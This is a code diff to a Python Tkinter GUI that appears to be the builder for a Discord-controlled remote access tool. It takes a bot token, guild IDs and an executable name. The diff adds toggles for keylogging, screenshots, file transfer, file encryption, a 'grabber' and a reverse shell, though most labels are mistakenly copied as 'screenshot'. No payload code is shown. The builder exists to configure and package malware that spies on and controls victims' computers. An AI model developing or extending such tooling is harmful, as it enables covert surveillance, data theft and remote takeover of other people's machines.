@@ -4,7 +4,7 @@ import random
 import os
 import json
 import tkinter.font as tkFont
-from PIL import Image, ImageTk
+from PIL import Image, ImageTk, ImageFont
 
 class Builder:
     def __init__(self, master):
@@ -54,7 +54,7 @@ class Builder:
             }
         }
 
-        self.general_settings_click()
+        self.general_settings()
 
     def new_background(self, demand=None):
         self.canvas.delete('all')
@@ -72,7 +72,7 @@ class Builder:
             text='General Settings',
             font=tkFont.Font(family='Consolas', size=10),
             disabledforeground='white',
-            command=self.general_settings_click
+            command=self.general_settings
             )
         self.general_settings_button.place(x=0, y=0, width=135, height=40)
 
@@ -118,7 +118,7 @@ class Builder:
     def draw_initial_content(self):
         self.canvas.create_text(200, 150, text='Initial Content', font=('Helvetica', 16), fill='black')
 
-    def save_configuration(self, temporary):
+    def save_configuration(self, temporary=True):
         try:
             self.configuration['token'] = self.token_entry.get()
             self.configuration['guild_ids'] = self.guildids_entry.get()
@@ -126,11 +126,9 @@ class Builder:
             self.configuration['directory_name'] = self.directory_entry.get()
             self.configuration['executable_name'] = self.executable_entry.get()
         except: pass
-
-
-
-
-
+        try:
+            print(self.cbvar_keylogr.get())
+        except: print('eror')
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
             configuration_file.write(json.dumps(self.configuration))
@@ -140,7 +138,7 @@ class Builder:
             self.configuration = json.loads(''.join(configuration_file.readlines()))
         
 
-    def general_settings_click(self):
+    def general_settings(self):
         self.general_settings_button['state'] = tk.DISABLED
         self.general_settings_button['relief'] = 'flat'
         self.functionality_settings_button ['state'] = tk.NORMAL
@@ -176,26 +174,11 @@ class Builder:
         self.executable_entry.insert(0, self.configuration['executable_name'])
         self.canvas.create_window(225, 200, window=self.executable_entry, anchor='w')
 
-        self.canvas.create_text(220, 230, text='Icon:', fill='white', font=('Consolas', 16), anchor=tk.E)
-
-
-
-
-
-
-
-
 
 
 
 
     def functionality_settings_click(self):
-
-
-
-
-
-
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
         self.functionality_settings_button ['state'] = tk.DISABLED
@@ -203,9 +186,169 @@ class Builder:
         self.compiling_settings_button['state'] = tk.NORMAL
         self.compiling_settings_button['relief'] = 'groove'
         self.save_configuration(True)
-        self.new_background()
+        self.new_background(1)
+        self.transparent_background = tk.PhotoImage(width=1, height=1)
 
-        self.canvas.create_text(200, 150, text='Content for Button 2', font=('Helvetica', 16), fill='green')
+        x_start, y_start, y_delta = 20, 200, 35
+
+        self.cbvar_keylogr = tk.BooleanVar(value=True)
+        self.cb_keylogr = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='keylogger',
+            font=('Consolas', 12),
+            variable=self.cbvar_keylogr,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*1, window=self.cb_keylogr, anchor='w')
+
+        self.cbvar_scrnsht = tk.BooleanVar(value=True)
+        self.cb_scrnsht = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_scrnsht,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*2, window=self.cb_scrnsht, anchor='w')
+
+        self.cbvar_fdownl = tk.BooleanVar(value=True)
+        self.cb_fdownl = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_fdownl,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*3, window=self.cb_fdownl, anchor='w')
+
+        self.cbvar_fupldg = tk.BooleanVar(value=True)
+        self.cb_fupldg = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_fupldg,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*4, window=self.cb_fupldg, anchor='w')
+
+        self.cbvar_frmval = tk.BooleanVar(value=True)
+        self.cb_frmval = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_frmval,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*5, window=self.cb_frmval, anchor='w')
+
+        self.cbvar_fexplr = tk.BooleanVar(value=True)
+        self.cb_fexplr = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_fexplr,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*6, window=self.cb_fexplr, anchor='w')
+
+        self.cbvar_fencrp = tk.BooleanVar(value=True)
+        self.cb_fencrp = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_fencrp,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*7, window=self.cb_fencrp, anchor='w')
+
+        self.cbvar_grabber = tk.BooleanVar(value=True)
+        self.cb_grabber = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_grabber,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*8, window=self.cb_grabber, anchor='w')
+
+        self.cbvar_mclive = tk.BooleanVar(value=True)
+        self.cb_mclive = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_mclive,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*9, window=self.cb_mclive, anchor='w')
+
+        self.cbvar_mcrecc = tk.BooleanVar(value=True)
+        self.cb_mcrecc = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_mcrecc,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*10, window=self.cb_mcrecc, anchor='w')
+
+        self.cbvar_process = tk.BooleanVar(value=True)
+        self.cb_process = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_process,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*11, window=self.cb_process, anchor='w')
+
+        self.cbvar_revshl = tk.BooleanVar(value=True)
+        self.cb_revshl = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='screenshot',
+            font=('Consolas', 12),
+            variable=self.cbvar_revshl,
+            command=self.save_configuration,
+            onvalue=True,
+            offvalue=False
+        )
+        self.canvas.create_window(x_start, y_delta*12, window=self.cb_revshl, anchor='w')
+
+
+
 
     def compiling_settings_click(self):
         self.general_settings_button['state'] = tk.NORMAL
